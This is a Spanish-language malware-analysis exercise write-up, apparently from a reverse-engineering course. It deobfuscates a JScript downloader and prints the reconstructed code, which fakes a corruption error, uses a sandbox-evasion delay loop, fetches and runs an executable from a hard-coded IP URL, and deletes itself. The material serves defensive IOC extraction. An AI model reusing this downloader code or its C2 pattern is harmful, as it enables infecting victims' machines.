   ‚îÇ                                                     |
   ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
   ‚îÇ   ... espacio libre ...                             ‚îÇ
   ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
   ‚îÇ   Stack (pila)                                      ‚îÇ
   ‚îÇ   - variables de main:                              ‚îÇ
   ‚îÇ       pae ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                            ‚îÇ
   ‚îÇ                        ‚îÇ                            ‚îÇ
   ‚îÇ                        ‚ñº                            ‚îÇ
   ‚îÇ                    [ int ]                          |
   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
   Direcciones altas
```


----------------------------------------------------------------------------------
Dir: 0x555555555038 Val: 0    // eni  (static sin inicializar)  ‚Üí .bss
Dir: 0x55555555502c Val: 99   // ei   (static inicializado)      ‚Üí .data
Dir: 0x5555555596b0 Val: 0    // *pae antes de asignar          ‚Üí heap (basura, aqu√≠ ha salido 0)
Dir: 0x5555555596b0 Val: 100  // *pae despu√©s de *pae = 100     ‚Üí heap
Dir: 0x5555555558034 Val: 9   // gni despu√©s de gni = 9         ‚Üí global .bss



----------------------------------------------------------------------------------

# Ejercicio 6 - Desofuscaci√≥n de un programa
Debes analizar este fragmento y extraer la funcionalidad que posee y los IOC (Indicadores de compromiso1) asociados (dominios, IP, etc) para crear reglas eficaces en los sistemas de defensa de la empresa.
- Deber√©is de desofuscar el ejemplar.
- Analizad de forma est√°tica (no lo ejecut√©is bajo nig√∫n concepto) su comportamiento y describid que hace o parece hacer.
- Extraer los IOCs si es que existe alguno.
- EXPLICAD PASO A PASO (si es con im√°genes mejor) como lo hac√©is.

```
UEsDBBQACQAIAPM6ZVMIoDTGoQ0AACk2AAANABwAZWplcmNpY2lvNi5qc1VUCQAD6s2EYevNhGF1eAsAAQT1AQAABBQAAAAcAXyDrLhtPcUuhNWk5YcR9yOpA6tWBu9VUojxU6yJJfn8OgpBndeIQQoAw6ZdO2GszQHKjAknQR2rvDW+zgFq2Nz7jrndVsMvEkZGVmcZRQ2iY4S9mUyTFbbNTGBd0/L+2+Pe7Y08VR2wL4TyfHR2YVIqAPyr2pp3Z9nwHo98IwHxylh912yhNaBKXcf0RHJ0CrjGkLI6pLhZxH9gAAtqJEtNDPqTacCNXa2iD9XCfPKjxMO8d41l1OHXIEhwtzKcvmS/GgJjWUJlZ89DCUp3xH3JN/oGKd2/eFc8wGKGi2bTNDD8p8X8chcRmByBoluGomMLPYh1/Unl1jd+R2afCYSA/2k+349IHTbOiFpTTN82JVo2+qrfx+t1+1p1rSD/CcH26xu7OXz2E+4+31/oTspkdjNk8XPjxrgAryqRG2X1koaC/Fpb6Q3HWIXNoE04azIkMKJhIMZvSamjTb6vpcf+lrmaHtnPwVT5VUW/8o6qy1EDwwOpWUE5Xg32vQszug7DeBCerp8Y0dCrWBKO0iTtWmwRaEEirBbMckSaKxMONiUTsmblpFkgBbyOUMj1ih7c8j6v4UAUB2t+URrVGmfqTNNuBIXrt8G0929EgwQEGK/v9AMgZ/kClewSrMO/zjDWFr3MUPAVj6GlXUviDBPdKOv8BpA+9flWleAs0DnU+DRrsmLpSeVfCH8a9FgnXort/MYZlcPKOfxcGTGC+iFo5M0gSVVnasks36oyr87X0eP7/WFYAuW19dRCWh+p7l1iMsOvGMfdn+wAcvKms2dX0/yhKm+GMTt2+JpelK7jlHKJFR+Jxfstqv6ud+aqfNf5cdrc+gGntJ1+iWMs9kaMAdu54hfk0VUMPBZ7jrNnDfWSD8PJcqCHkOSQYBbU8jh4D9h5ZRRpfFPf7gI7D13jOFVETQSAT8LUR/9kGuwyRLtr5MiuH2JT1RxXTGMdQFGVcpqGbdx7yiKqMZROiOrTqLxVwk1vQy0xrTi3k5dpVtWoILK+hauT/w5wjGvddzAPfG//TsCthCqOwB8v56sarX1iwUk1pUZkjTPwR14pZtYxs0WyVDelZO4vIP2ZWcNFJrDV/GhOdizIBvabjauUsJVzeGeUgd1iTdwlP/KHpewDphlUxpbxuVdB2FU4vRbDHB7wusn9k3TgRpweYHvukDT0p/WCs9Bd0TiodanI47kOUyHx9QLSuLl2shgtwa+HjCkjxLFu0kgxJA3FNzRckiKfJwcLKc8kUxtBTIDOq1KlCJmE1t7DcMdmjCvJ9zx9tC0Lsur0TpSltlILzGKpTkbt/fIudKslozyY2Ye4QihzK4Kp3EythjvuAALW08ABwxpnBvjHCzFthyi8A3T8O0QAIPx3q81oT9KhsKVOX680jkP3MYkdIQ5e13I+gyCnUt9GHFOaFkBENX1Og0liJ3ZD1Qgubp5/IPzBg0PYnD/jvncTHnCfSAxnCnM5zDYv+dOrJXVZBS5GTcDbAmcQSs1Kg2TExu3uaLLZyF+vZ/fZ2MImXmcEGOq+swTMkfgSIaxfqbyyGUYcmtQYWQ8BqUDRaG6wbzosSnj/oMYTA8ay2EOp/KX7pJHorzLconsTaj3l3dA2DKCyUMYrdE9MRUhgzJKqlo0fxZnWVqNjvIDu4FSqQgzY8SEdARCFNKUnvZcKRdUYN0IYCtmNdurzLuP/E7Zs8QzLBu43/ik38Ic7GS5ysTOjB05wY67ODrC5gNjz34cYZU5wDs/Mdx16RPeXkJs880SiDqune9lyRJ3NFqnN1E/8QLj8g8rgMPRdJXxHeO/DaM4UH4nGEr+OSMbZj+SFek96mOyTzCI80eLRmloLdnF18PunkOlqx9fmHAxsNG4f7airkavLgC0+w1ifVb6Rh/fZ8S5UE+vXGCfz+eC9mTL/kbcSrLm8PUmpwIeF8eCgRV6vAm9Fr3Lj8Z1C8gOyd5rnfQQhWUxQY8lbX4vm18aK3sN+L9cbfqob62BhGY1dAOk6Z4YGziTV3lZ7ZWuC1yXpO1qjMj5WqmRZT2HNI4VhdJxsoI0Bygn3ek0I+OMTLAQ++ydzx+QNyZTy4zhwykhKgzwp57whrQupc1R2+7GagWsEXVtxY/NTD6jL5LWAr07/q8uZKeILDYxMHE5zKaVloB3tslPDur6VunQa7BXN8FJAKoUGOzV38h+Dn8gbs6jZbUEyCiC4H7CNaqe6zJJEYYeY/Rsga4PQOgIM3vDP5suIlQx6XdCDhR+bPdo0ateGAT0bbGH9A0WRDjeFNvanAvvBxuEWte8qd7l2fhPTaIoDqcCCt5IVmqSK/wcmf4fW6Of3RSEs95CP1dKLil0QvSdLWkqsw8z342CBslzogEv0jui7ktwouvMv6XpkeH52LFzGKqKhvmp1I2MMFK05Sn23VQQFTOi+zo2BH3qscBi1O5VQ8q7EvacGcygf9h+FshlNwGvadrts02BDnnFk6VkLFEcqBIqNntUNcc/xXmLpyFu1SvKGzOaONG6643vXhzntDRi7geA4+KYTTD8FQGtgcxQkB5qoGjE+KAX6EOorDv7GhCcF0n9Xeka+n9Dy+VJB0thFmhfdEJcV/JhEZcUsHMKi3j6JLHWzVkuIVzPMBQqe+O49qQUDHWHNkqVwh9qvTIn4em7LHjrWm6Mgp9J9nPHOEGDnAGX7bwXhSQ6tz56Zu+OGj8j2NY4XFyFIXAKoqpfKmCBSaOfNx+cwi2FtW/zNpOgVQUNXuvQRw20GFJLFEuBmW8iDSphjRfarL4k6AxdF3hP90vUvcLFnV/5aDqEcqz7vGoCwWDs1hLj6h2zuWM/0GdONF3qRvfuqgWCuXMgaKgRtCFx5FGL0Y5WcR/545GBGw8hXiUrgOjA2Uva17pd3aieTSzkq24qU5ZxVht8dS9tGBR+OCsLzDX5aroZXT5/Q8N0II5hFUmuBWnemXkUlwf2D0NSh+gfcpo/MGX/fvRgbgip1kam+k5tei45yizfqMtAMGahZT/GSFgny0DV67E+AHulRJlRY3Qwnl+VZlM302ZrSLlNVovRt1C7dcAqLHoykQwBXGxjOvGkkq/4f/8C4aGgwYdJqalo7qsmZ7x9DwN1Mwz6+J5ZqIH0T1CjM6FVDO8WmAxCIp0fkTSSGGa6Sbkk7Msp5opgJxX3ztu3F0rx8KoQ7C0GmQGxxdoyJLqQB0td/WMBnOF72Nbg8M82fpS/5eG1x8RQD9eamPIhSTne3zTRG8CVg253ZwYYCrYbVWRdSpAMfreGp2aPPiKUc7Yjfh3gG2A/qbuTt9AcnzORFnyA7yRxbJ5m3/OVr4XVHGQsRWZoRnbDqvMkPMfACxn9+GXeGakgv4mnN2ZYSIi3VDPluBNEhW5QsbTx0EfFlI7yugtgrDA//NA6zXtKLEiZApFFl6fNiTSlQhTQ3t+1HVXzV/f8DmjbbNo6qbYXdh3JQbLf+5tNETNtyQ/gYEyWe7ZW/WkfCaT1DqVXpqhYmJV+HWCZGg9t4zc23qZFMQqIid3LJ1s4uM6nyUm5XyRtNn/MUANOaNm5irQrtWHvqNnWUhI2upyryjLeRmczVfwzPVTrKQ+Blhd+vx7T/88+POG18U5zWd1/c9ou3SteK7BzTsxRmLatUTGp+r4NmEMsP2I5iWeB205+PUTI+NqKgePdt0NEMEXkFQZc2oWWoxPEiNdBbUK/1aLM5BcdLUbw508+sQlZ+D/uk6isgQbRX5AbxnrHCabsjgVmmz3zc6appknTosrlIEdSIYj3D48tl8QkXo0h1CZ4Gwzkvngjv5W/cTJjs5hhxofCG87cSnmkso9uIHg/JubJ5pff/Ob64a8I23o3swW2v/5S1ObSVRqsYsWkLaw5PzR4QMHKerqcaSzzhDbOYy/yesBPF+NyI5VqlxHriLPjomMAJhvZhxcNFMnOKZ7AbZGvSR8oA/bo3PbDsgHvV1Qs9ySImg1v74nxKpIj+1THuYcrsWkEU1bGnEcce1Bhh1HSjkmvu0ZmNFF2VzKIl01j7KHXZoYnZ3cPMYh08PCQh6yELj1BsIXZ7Vcf48j8vHZoC4cHeYkvWgBTg9gylFqEEq62Qs5oIgQQzzVfuPSr289Im2oV4bddnHF6Wfx5wdCxIGkgi33gXNiiy/Ghfs8iDUgD1vgPSiXak4t0z3Wd/9dokvrVrBVpVGMLTEJyO9150eBoKUBNe7AFp/slqgYuvB+qoaNp5COzuVL3C+waf8igQo6lsxVlk1C+RXvTFPYTdOotQoCgJrObhokXQEnQ7uDIr/MrpzC4zzc7G8ZPSK4SdKAUlHxDHNN8BghblWCarNjkJv90mb+ff47ff1HOZ90HgUlBQTEEwUGce3V2NEl4i9MpOfCts79fUcfIk010ziVWmUSKtw6U7XbyXVG050dOQ8A+zWiKOYwOWDor/EPsi1Iv7RDaTKyOfzABQyFjZkwhKFNus1f+z81cfNBMUFe+SSdjxODry5ictYjNMQYHihBNuKVBrusy0Mwv2SqENT6XRMKbEAaPP8CqJKkcUGPcq83UXDZmTd5Op1p81nJW/q0hRwmn4+YtBPG9BAXz/lyrvpzeO4bhBPRfJTdG10BS1nSnNb+5J66vzXPbmgd2rQc3G88koCHmOT0H5h7UA8ymd+hJc/xPi3URQSwcICKA0xqENAAApNgAAUEsBAh4DFAAJAAgA8zplUwigNMahDQAAKTYAAA0AGAAAAAAAAQAAAKSBAAAAAGVqZXJjaWNpbzYuanNVVAUAA+rNhGF1eAsAAQT1AQAABBQAAABQSwUGAAAAAAEAAQBTAAAA+A0AAAAA
```

Ese fragmento est√° codificado y comprimido, luego ten√©is que realizar las siguientes operaciones para obtener el original (vamos a suponer que lo hab√©is guardado en un archivo: mrev_t1_exe6.txt):
- $ base64 -d mrev_t1_exe6.txt > mrev_t1_exe6.zip
- $ unzip ejercicio.zip
- La contrase√±a es: master2021

Pistas:
- Nada es lo que parece a simple vista
- Javascript es un lenguaje con un comportamiento‚Ä¶curioso
- A veces es mejor intentar cosas peque√±as, de forma aislada‚Ä¶
- Node es tu amigo
- Sustituci√≥n es mejor que fuerza bruta

![Precauci√≥n](capturas/precauci√≥n.png)


----------------------------------------------
## Desofuscaci√≥n del archivo

### Buscamos finalizaciones de l√≠nea

![ejercicio6-1.png](capturas/ejercicio6-1.png)

### B√∫squeda de cadenas con `\uXXXX`:
Cada `\uXXXX` es un car√°cter Unicode en hexadecimal. Ejemplo:
- `\u0041 ‚Üí A`
- `\u0063 ‚Üí c`
- `\u0074 ‚Üí t`
- `\u0069 ‚Üí i`
- `\u0076 ‚Üí v`
- `\u0065 ‚Üí e`

### Eliminamos {...} seguido de un punto .
Esto es Basura. Solo importa lo que est√° entre comillas.

Vamos a usar Expresiones Regulares (Regex) para quitar esa basura. En Visual Studio:
- Abrimos "Buscar y Reemplazar".
- Activamos el bot√≥n de "Usar Expresi√≥n Regular".
- Buscamos: `\{[^{}]+:(".*?")\}\.[a-zA-Z0-9]+`
- Reemplazamos con: `$1`. Mantendr√° s√≥lo lo que encuentra dentro del primer par√©ntesis (las comillas).

![ejercicio6-2.png](capturas/ejercicio6-2-ok.png)


### Quitar los s√≠mbolos +
Ahora vamos a quitar los `+`:
- Abrimos "Buscar y Reemplazar".
- Activamos el bot√≥n de "Usar Expresi√≥n Regular".
- Buscamos: `"\+"`.
- Reemplazamos con: Dejamos vac√≠o.

![ejercicio6-3.png](capturas/ejercicio6-3.png)


### Unir las cadenas
- Abrimos "Buscar y Reemplazar".
- Activamos el bot√≥n de "Usar Expresi√≥n Regular".
- Buscamos: `"\s*\+\s*"`.
- Reemplazamos por: Dejamos vac√≠o.



### Convertir todos los u00xx a caracteres 
Podemos usar el propio navegador para hacer esa conversi√≥n:
- Copiamos el bloque con las comillas y las secuencias \u00xx (por ejemplo "\\u0041\\u0063...").
- En la consola del browser usamos:
  ```
  // Pegamos las cadenas ofuscadas
  const s = "\\u0041\\u0063\\u0074\\u0069\\u0076\\u0065\\u0058\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074";

  const decoded = s.replace(/\\u[0-9a-fA-F]{4}/g, m =>
    String.fromCharCode(parseInt(m.slice(2), 16))
  );

  console.log(decoded);  // Veremos el resultado desofuscado la cadena
  ```
  ![ejercicio6-4.png](capturas/ejercicio6-4.png)
  
- Reemplazamos en el archivo el texto ofuscado por el decoded que ha impreso el console.log.
  ```
  var pre_computer = this["ActiveXObject"]
  ```

Repetimos el proceso con Node:
- Creamos un archivo decode.js:
  ```
  let s = "\\u0057\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074";

  let decoded = s.replace(/\\u[0-9a-fA-F]{4}/g, m =>
    String.fromCharCode(parseInt(m.slice(2), 16))
  );

  console.log(decoded);
  ```

- Ejecutamos este archivo con node:
  ![ejercicio6-5.png](capturas/ejercicio6-5.png)


Repetimos el proceso para todas las cadenas ofuscadas. Obtenemos:
```
pre_interactions=null;
pre_including8=null;
pre_with=null;
pre_Similar=null;
pre_customer=null;
pre_with2=null;
pre_training2=null;
pre_provide5=null;
pre_with=null;
pre_malicious1=null;
pre_purposes=null;
pre_software5=null;
varpre_computer=this["ActiveXObject"];
varWSSS12=this["WScript"];
varpre_your=WSSS12["CreateObject"]("WScript.Shell");
varpre_your8=newpre_computer("Scripting.FileSystemObject")
varfstream=newpre_computer("ADODB.Stream");
varoShell=newpre_computer("Shell.Application");
varpre_from=pre_your["ExpandEnvironmentStrings"]("%TEMP%")
varpre_geolocation6=pre_from+"\\floor](Math["random"]()*(20+20+5+5+25+25)+1)+".exe";
varxhr12=newpre_computer("Msxml2.ServerXMLHTTP")
varpre_national7="\aflash_update.js"
varpre_interactions4=oShell["NameSpace""](3+2+2);
arpre_information5=false;
varpre_mobile7=false;
vartone=1;
varpre_following4=0;
arpre_information=0;
varfilets=null;
varpre_your="";
varscrpath=WSSS12["ScriptFullName"];
varautor=pre_interactions4.Self.Path+pre_national7;varpre_overheard=autor;varpre_from="https://217.28.218.217/NOPE/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt";
if(scrpath!=autor&&pre_information5==false){pre_information5=true;
    pre_your8["DeleteFile"](scrpath);
    WSSS12["echo"]("he document is corrupted an\d cannot be opened")
    WSSS12["Sleep"](5000);
}for(pre_information=0;
    pre_information<pre_overheard.length;
    pre_information++){pre_following4=((pre_following4<<5)-pre_following4+pre_overheard.charCodeAt(pre_information))&0xffffffff;}while(true){tone=tone+1
        if(tone==200000000){while(true){try{xhr12["setOption"](3,"MSXML");xhr12["open"]("GET",pre_from+"&"+Math["&"floor"](Math["random"]()*200+1)+"&uid="+Math["abs"](pre_following4),false);
        xhr12["send"]();if(xhr12["status"]==100+50+50){if(pre_your8["FileExists"](pre_geolocation6))pre_your8["DeleteFile"](pre_geolocation6);
        fstream["Open"]();fstream["Type"]=1;
        fstream["Write"](xhr12["responseBody"]);
        fstream["Position"]=0
        fstream["SaveToFile"](pre_geolocation6);
        fstream["Close"]();filets=pre_your8["GetFile"](pre_geolocation6)["OpenAsTextStream"](1)
        if(pre_your8["FileExists"](pre_geolocation6)&&filets["ReadLine"]()[""substring""](0,2)=="MZ"){pre_mobile7=true;oShell["ShellExecute"](pre_geolocation6,"","","open1")
            if(pre_your8["FileExists"\u0074""\u0073""](WSSS12["ScriptFullName""]))pre_your8["DeleteFile"](WSSS12["ScriptFullName"])
                WSSS12["Sleep""](20*200);if(pre_your8["FileExists"](pre_geolocation6))pre_your8["DeleteFile"](pre_geolocation6);
            filets["Close"]();
            break;
        }filets[""Close"]();
    }}catch(e){}if(pre_mobile7==true){break;

    }WSSS12["Sleep"](10000*8);
}break;
}}pre_experienceInformation1=0.619;
pre_collect2=0.826;
pre_interactions4=0.82;
pre_numbers8=0.266;
pre_sent=318;
pre_access=170;
pre_companies=628;
pre_law=100;
pre_PayPal10=164;
pre_PayPal1=0.73;
pre_warningInformation=0.277;
pre_applicable=363;
pre_order=0.951;
pre_receive=412;
pre_information=542;
pre_reason3=759;
pre_conversations8=126;
pre_receive=884;
pre_data6=0.278;
```

#### A√±adir espacios donde falten en var...
Por ejemplo en varpre_computer ‚Üí le falta un espacio: deber√≠a ser algo como var pre_computer = ...
Corregimos todos estos espacios en blanco.


#### Renombrar variables para entender la l√≥gica
```
var ActiveXObject_   = this["ActiveXObject"];
var WScriptObj       = this["WScript"];
var shell            = WScriptObj["CreateObject"]("WScript.Shell");
var fso              = new ActiveXObject_("Scripting.FileSystemObject");
var stream           = new ActiveXObject_("ADODB.Stream");
var shellApp         = new ActiveXObject_("Shell.Application");
var tempPath         = shell["ExpandEnvironmentStrings"]("%TEMP%");
var targetPath       = tempPath + "\\" +
                       Math["floor"](Math["random"]()*(20+20+5+5+25+25)+1) +
                       ".exe";
var http             = new ActiveXObject_("Msxml2.ServerXMLHTTP");
var scriptCopyName   = "\\aflash_update.js";
var folder3          = shellApp["NameSpace"](3+2+2);  // carpeta especial

var hasRun       = false;
var executed     = false;
var tone         = 1;
var hash         = 0;
var tmpFile      = null;
var scriptPath   = WScriptObj["ScriptFullName"];
var autor        = folder3.Self.Path + scriptCopyName;
var remoteUrl    = "https://217.28.218.217/NOPE/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt";

```

### Limpiar llamadas a los objetos
Vamos a limpiar las llamadas tipo objeto["metodo"] a objeto.metodo: Para hacerlo a√∫n m√°s legible, vamos sustituyendo por ejemplo `shell["ExpandEnvironmentStrings"]` por `shell.ExpandEnvironmentStrings`. Repetimos con el resto de objetos que nos encontramos en el c√≥digo.


### A√±adimos identaci√≥n y espacios en blanco
```
pre_interactions    = null;
pre_including8      = null;
pre_with            = null;
pre_Similar         = null;
pre_customer        = null;
pre_with2           = null;
pre_training2       = null;
pre_provide5        = null;
pre_with            = null;
pre_malicious1      = null;
pre_purposes        = null;
pre_software5       = null;

// INICIALIZACI√ñN DE OBJETOS
var ActiveXObject   = this["ActiveXObject"];
var WScriptObj      = this["WScript"];
var shell           = WScriptObj.CreateObject("WScript.Shell");
var fso             = new ActiveXObject("Scripting.FileSystemObject")
var stream          = new ActiveXObject("ADODB.Stream");
var shellApp        = new ActiveXObject("Shell.Application");

// RUTAS Y CONFIGURACI√ìN
var tempPath        = shell.ExpandEnvironmentStrings("%TEMP%")
var targetPath      = tempPath+"\\" + Math.ramdom () * (20+20+5+5+25+25)+1 + ".exe";
var http            = new ActiveXObject("Msxml2.ServerXMLHTTP")
var scriptCopyName  = "\\aflash_update.js"
var folder          = shellApp.NameSpace(3+2+2);
var hasRun          = false;
var executed        = false;
var tone            = 1;
var hash            = 0;
var pre_information = 0;
var tmpFile         = null;
var shellString     = "";
var scriptPath      = WScriptObj.ScriptFullName;
var autor           = folder.Self.Path+scriptCopyName;
var pre_overheard   = autor;
var tempPath        = "https://217.28.218.217/NOPE/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt";


// LOGICA DE PERSISTENCIA
if (scriptPath !=autor && hasRun == false){
    hasRun=true;
    fso.DeleteFile(scriptPath); // Se borra a s√≠ mismo
    WScriptObj.echo("he document is corrupted an\d cannot be opened")
    WScriptObj.Sleep(5000);
}

// ALGORTIMO DE HASHING - IDENTIFICADOR UNICO
for (pre_information=0; pre_information<pre_overheard.length; pre_information++){
    hash=((hash<<5) - hash + pre_overheard.charCodeAt(pre_information)) & 0xffffffff;
}


// BUCLE PRINCIPAL
while(true){
    tone = tone + 1
    
    if ( tone == 200000000 ) {
        while (true) {
            try{
                http.setOption(3,"MSXML");
                http.open(
                    "GET",
                    tempPath + "&" + Math.floor(Math.random() * 200+1) + "&uid="+Math.abs(hash),
                    false);
                http.send();
                
                if ( http.status == 100+50+50){
                    if ( fso.FileExists(targetPath) ) {
                        fso.DeleteFile(targetPath);
                }

                stream.Open();
                stream.Type=1;
                stream.Write(http.responseBody);
                stream.Position=0
                stream.SaveToFile(targetPath);
                stream.Close();
                
                tmpFile = fso.GetFile(targetPath).OpenAsTextStream(1)
        
                if (fso.FileExists(targetPath) && tmpFile.ReadLine().substring(0,2) == "MZ") {
                    executed=true;
                    shellApp.ShellExecute(targetPath,"","","open1")
            
                    if (fso.FileExists(WScriptObj.ScriptFullName)) {
                        fso.DeleteFile(WScriptObj.ScriptFullName)
                    }
                    
                    WScriptObj.Sleep(20*200);
                    
                    if(fso.FileExists(targetPath)) {
                        fso.DeleteFile(targetPath);
                    }

                    tmpFile.Close();
            
                    break;
                }
                tmpFile.Close();
    
            }
        }catch(e){ 

        }
        
        if(executed==true){
            break;
        }

        WScriptObj.Sleep(10000*8);
        }
        break;
    }
}

pre_experienceInformation1=0.619;
pre_collect2=0.826;
folder=0.82;
pre_numbers8=0.266;
pre_sent=318;
pre_access=170;
pre_companies=628;
pre_law=100;
pre_PayPal10=164;
pre_PayPal1=0.73;
pre_warningInformation=0.277;
pre_applicable=363;
pre_order=0.951;
pre_receive=412;
pre_information=542;
pre_reason3=759;
pre_conversations8=126;
pre_receive=884;
pre_data6=0.278;
```


## Analisis del comportamiento del malware
Bas√°ndonos en el c√≥digo que hemos desofuscado y reconstruido podemos determinar que este script es un Downloader/Dropper (Descargador). Su √∫nico prop√≥sito es servir de puerta de entrada para infectar el equipo con otro virus m√°s peligroso.
- **Comportamiento:** Al ejecutarse, muestra un mensaje de error falso: "The document is corrupted and cannot be opened". Usa Ingenier√≠a Social --> Enga√±o.
- **Objetivo:** Hacer creer a la v√≠ctima que el archivo simplemente estaba roto, para que no sospeche que hay un script ejecut√°ndose en segundo plano.

### Persistencia - Auto-instalaci√≥n
```
if (scriptPath !=autor && hasRun == false){
    hasRun=true;
    fso.DeleteFile(scriptPath); // Se borra a s√≠ mismo
    WScriptObj.echo("he document is corrupted an\d cannot be opened")
    WScriptObj.Sleep(5000);
}
```
donde:
- Comprueba si:
  - el script no se est√° ejecutando desde la ruta ‚Äúobjetivo‚Äù (scriptPath != autor), y
  - este bloque a√∫n no se ha ejecutado en esta sesi√≥n (hasRun == false).
- Se borra a s√≠ mismo.
- Enga√±a al usuario con un mensaje.
- Espera 5 segundos y luego el script contin√∫a con el resto de la l√≥gica (descargar ejecutable, etc.).

**Comportamiento:**
- Verifica si se est√° ejecutando desde la carpeta de Inicio de Windows (Startup).
- Si no est√° ah√≠, su intenci√≥n es copiarse a s√≠ mismo en esa carpeta bajo el nombre flash_update.js.

**Objetivo:** Asegurarse de que el virus se ejecute autom√°ticamente cada vez que la v√≠ctima encienda el ordenador. Usa el nombre "Flash Update" para parecer leg√≠timo si alguien revisa esa carpeta.


### Huella Digital  - Fingerprinting
```
for (pre_information=0; pre_information<pre_overheard.length; pre_information++){
    hash=((hash<<5) - hash + pre_overheard.charCodeAt(pre_information)) & 0xffffffff;
}
```

**Comportamiento:** Genera un identificador √∫nico (uid) basado en un hash de la ruta donde est√° instalado el archivo.

**Objetivo:** Identificar a cada v√≠ctima de forma √∫nica ante el servidor del atacante. As√≠ saben cu√°ntas m√°quinas han infectado y si una petici√≥n viene de una m√°quina nueva o repetida.


### Evasi√≥n de Antivirus - Anti-Sandbox
**Bucle infinito exterior:**
```
while (true) {
    tone = tone + 1;
    ...
}
```
donde:
- No hace nada ‚Äú√∫til‚Äù hasta que tone alcanza un valor concreto.

**Cuando `tone == 200000000`**
```
if (tone == 200000000) {
    while (true) {
        ...
    }
    break;
}
```
donde:
- Cuando tone llega a 200000000, entra en otro bucle infinito interno.
- Despu√©s de que ese bucle interno termine, hace break; y sale del bucle exterior.

**Comportamiento:** Ejecuta un bucle while que cuenta hasta 200.000.000 antes de hacer nada malicioso.

**Objetivo:** Enga√±ar a los sistemas de an√°lisis autom√°tico (Sandboxes). Muchos antivirus ejecutan un archivo sospechoso durante unos segundos en un entorno aislado para ver qu√© hace. Como este script se pasa los primeros minutos "haciendo nada" (contando), el antivirus piensa que es inofensivo y lo deja pasar. O si lo ejecutamos en plataformas como ANY.RUN, dado que la versi√≥n gratuita tiene un l√≠mite de tiempo para el an√°lisis, podr√≠a provocar que el an√°lisis finalice antes de que se active el c√≥digo malicioso, debido al bucle de retardo.

  



### Conexi√≥n con el Servidor de Mando y Control - C2
**Dentro del while (true) interno:**
```
try {
    http.setOption(3, "MSXML");
    http.open("GET", tempPath + "&" + Math.floor(Math.random()*200+1) + "&uid=" + Math.abs(hash), false);
    http.send();
```
donde:
- Configura un objeto HTTP (http).
- Hace una petici√≥n GET a una URL construida a partir de:
  - tempPath (que realmente es una URL base),
  - un n√∫mero aleatorio,
  - y un uid √∫nico basado en hash que vimos en el apartado de Fingerprinting.

**Comportamiento:** Realiza una petici√≥n web (HTTP GET) a la IP 217.28.218.217.

**Objetivo:** Contactar con el atacante para decir "estoy vivo" y descargar la carga da√±ina (payload).


### Descarga y Validaci√≥n del Malware
**Si la respuesta es ‚Äúcorrecta‚Äù (c√≥digo 200):**
```
if (http.status == 100 + 50 + 50) { // 200
    if (fso.FileExists(targetPath)) fso.DeleteFile(targetPath);

    stream.Open();
    stream.Type = 1;
    stream.Write(http.responseBody);
    stream.Position = 0;
    stream.SaveToFile(targetPath);
    stream.Close();

    tmpFile = fso.GetFile(targetPath).OpenAsTextStream(1);
```
donde:
- Comprueba que status es 200.
- Si ya exist√≠a un fichero en targetPath, lo borra.
- Abre un stream binario, escribe en √©l el cuerpo de la respuesta (responseBody).
- Lo guarda en disco en targetPath.
- Cierra el stream y vuelve a abrir el fichero como texto (tmpFile).

**Comprueba si el fichero parece un ejecutable PE:**
```
if (fso.FileExists(targetPath) &&
    tmpFile.ReadLine().substring(0, 2) == "MZ") {
    
    executed = true;
    shellApp.ShellExecute(targetPath, "", "", "open1");
    ...
}
```
donde:
- Verifica que el fichero existe.
- Lee la primera l√≠nea y mira si los dos primeros caracteres son "MZ".
- "MZ" es la firma t√≠pica de un ejecutable de Windows (formato PE).
- Si se cumple:
  - Marca executed = true.
  - Lanza ese fichero con ShellExecute (lo ejecuta).

**Comportamiento:**
  - Descarga un archivo binario y lo guarda en la carpeta temporal (%TEMP%) con un nombre num√©rico aleatorio.
  - Validaci√≥n MZ: Lee los dos primeros caracteres del archivo descargado. Si son "MZ", confirma que es un ejecutable de Windows v√°lido.

**Objetivo:** Asegurarse de que la descarga no fall√≥ ni fue interceptada por un firewall antes de intentar ejecutarla.



### Ejecuci√≥n y Limpieza
**Borrado del propio script y del fichero descargado:**
```
if (fso.FileExists(WScriptObj.ScriptFullName))
    fso.DeleteFile(WScriptObj.ScriptFullName);

WScriptObj.Sleep(20 * 200);

if (fso.FileExists(targetPath))
